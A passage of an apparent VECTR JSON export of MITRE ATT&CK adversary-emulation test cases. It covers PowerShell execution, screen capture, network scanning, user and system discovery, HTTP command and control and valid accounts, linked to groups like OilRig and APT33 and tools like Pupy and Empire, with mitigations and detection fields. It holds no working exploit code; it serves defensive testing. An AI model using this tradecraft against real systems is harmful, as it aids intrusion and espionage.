executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has used PowerShell for execution and privilege escalation.When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. \n---\nSet PowerShell execution policy to execute only signed scripts. \n---\nIt may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.\n---\n[Pupy](https://attack.mitre.org/software/S0192) has a module for loading and executing PowerShell scripts.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0","relationship--110690db-fd9b-425a-9269-ec082f0af3f9","relationship--b188b994-7965-4c34-81d6-307f218ba80e","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--79568b8a-09c2-40fa-acd9-c7d369059b6a","course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312","relationship--39962764-cf46-4f39-9dd9-95b0ced56d93","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--1f8f6283-6004-4204-a54f-759e9c0519b1","course-of-action--d0415180-51e9-40ce-b57c-c332b0b441f2","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--328636ab-7265-4212-96d4-4ebf2e6a65db","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019. https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/","Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018. https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/","Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016. https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html","Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016. https://github.com/jaredhaight/PSAttack","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016. http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf","Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016. https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018. http://www.sixdub.net/?p=367"],"mitreId":"T1086"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e6f672c4-86f3-4512-89a5-1356ad55d690","vectrId":"e6f672c4-86f3-4512-89a5-1356ad55d690","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","templateId":"e6f672c4-86f3-4512-89a5-1356ad55d690","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Screen Capture","variant":"Magic Hound - Screen Capture - Pupy","objective":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\n### Mac\n\nOn OSX, the native command <code>screencapture</code> is used to capture screenshots.\n\n### Linux\n\nOn Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware can take a screenshot and upload the file to its C2 server.[Pupy](https://attack.mitre.org/software/S0192) can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688","relationship--65f7704a-358a-464d-b09b-fee5dd96adf3","relationship--366214ea-29b0-458a-a852-7a76420783d2","course-of-action--51b37302-b844-4c08-ac98-ae6955ed1f55","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--09869965-8dcd-4c20-a997-c075b6ed0434","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017. https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/"],"mitreId":"T1113"},"blueTeam":{"successfulDetectionBehaviors":["Blocking software based on screen capture functionality may be difficult, and there may be legitimate software that performs those actions. Instead, identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--e8d72781-108d-4a35-9342-7261debfa329","vectrId":"e8d72781-108d-4a35-9342-7261debfa329","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"e8d72781-108d-4a35-9342-7261debfa329","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Network Service Scanning","variant":"OilRig - Network Service Scanning","objective":"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.\n---\nUse network intrusion detection/prevention systems to detect and prevent remote service scans.\n---\nEnsure proper network segmentation is followed to protect critical servers and devices.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88","relationship--393a3ec4-9970-44ab-ae63-1e9c6bed0310","relationship--371d43af-ef68-4471-9db9-f2d40d2baefc","course-of-action--d256cb63-b021-4b4a-bb6d-1b42eea179a3","relationship--32d482c4-2c0d-4688-a38b-d73b5b2962a3","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--651225d6-5454-4c44-8d62-776bd7ddaed2","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--80f94d40-0861-4403-b206-1c864a136788","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east"],"mitreId":"T1046"},"blueTeam":{"successfulDetectionBehaviors":["Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Use intrusion detection signatures to block traffic at network boundaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--eab6e8ef-693b-4cec-ae19-23ce214368c6","vectrId":"eab6e8ef-693b-4cec-ae19-23ce214368c6","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"eab6e8ef-693b-4cec-ae19-23ce214368c6","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Owner/User Discovery","variant":"OilRig - System Owner/User Discovery","objective":"### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has run <code>whoami</code> on a victim.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104","relationship--b22cebe6-129a-41a2-8a9e-70c222c88af6","relationship--f1000a93-e87d-4acf-b71d-73c3bb05fd75","course-of-action--16f144e4-c780-4ed2-98b4-55d14e2dfa44","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/"],"mitreId":"T1033"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--eb0f0b89-d74f-4e96-82d8-757037071d91","vectrId":"eb0f0b89-d74f-4e96-82d8-757037071d91","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"eb0f0b89-d74f-4e96-82d8-757037071d91","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Standard Application Layer Protocol","variant":"APT33 - Standard Application Layer Protocol - Pupy - PoshC2 - Empire","objective":"Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used HTTP for command and control.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can communicate over HTTP for C2.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) can use protocols like HTTP/HTTPS for command and control traffic.\n---\n[Empire](https://attack.mitre.org/software/S0363) can conduct command and control over protocols like HTTP and HTTPS.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["740b39a7-cf4c-4c2d-acf1-585754a5b04f","76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6","relationship--bf7102db-9b22-4534-ac52-83d95152c242","relationship--2a0b74b3-cbc3-45fa-aba4-eabdb0cb89b5","course-of-action--addb3703-5a59-4461-9bcd-7e2b5d4e92a0","relationship--19f35c88-92c4-4e98-b024-be9f6731bdb5","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--85112c0c-3096-4118-9ba6-ed173128544f","tool--4b57c098-f043-4da2-83ef-7588a6d426bc","relationship--16e57ad0-b460-41bd-bef0-5bf110d8db8f","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--9983965f-91b7-492b-9764-ad801af4476a","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Nettitude. (2018, July 23). Python Server for PoshC2. Retrieved April 23, 2019. https://github.com/nettitude/PoshC2_Python","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf"],"mitreId":"T1071"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--eb69bf56-e5c5-4e41-aa62-d9543d43046a","vectrId":"eb69bf56-e5c5-4e41-aa62-d9543d43046a","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"eb69bf56-e5c5-4e41-aa62-d9543d43046a","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Information Discovery","variant":"OilRig - System Information Discovery - Systeminfo","objective":"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.\n\n### Mac\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.\n\n### AWS\n\nIn Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)\n\n### GCP\n\nOn Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)\n\n### Azure\n\nIn Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)\n---\n[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has run <code>hostname</code> and <code>systeminfo</code> on a victim.\t[Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather information about the operating system.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["ab28ed11-37b5-4472-877d-52639dbe9af2"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1","relationship--0c03f2b4-a752-4d74-9c26-5306132a3329","relationship--c28d6f10-431f-493c-8abd-918240c5c970","course-of-action--c620e3a1-fff5-424f-abea-d2b0f3616f67","tool--7fcbc4e8-1989-441f-9ac5-e7b6ff5806f1","relationship--c088f23e-b741-453c-a710-01990dead853","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Amazon. (n.d.). What Is AWS Application Discovery Service?. Retrieved October 8, 2019. https://docs.aws.amazon.com/en_pv/application-discovery/latest/userguide/what-is-appdiscovery.html","Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019. https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard","Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/","Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019. https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get","Microsoft. (n.d.). Systeminfo. Retrieved April 8, 2016. https://technet.microsoft.com/en-us/library/bb491007.aspx"],"mitreId":"T1082"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--ebddbaad-4b66-497e-89fd-142439d98549","vectrId":"ebddbaad-4b66-497e-89fd-142439d98549","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"ebddbaad-4b66-497e-89fd-142439d98549","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Valid Accounts","variant":"APT39 - Valid Accounts","objective":"Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. \n\nAccounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\n\nCompromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nDefault accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or 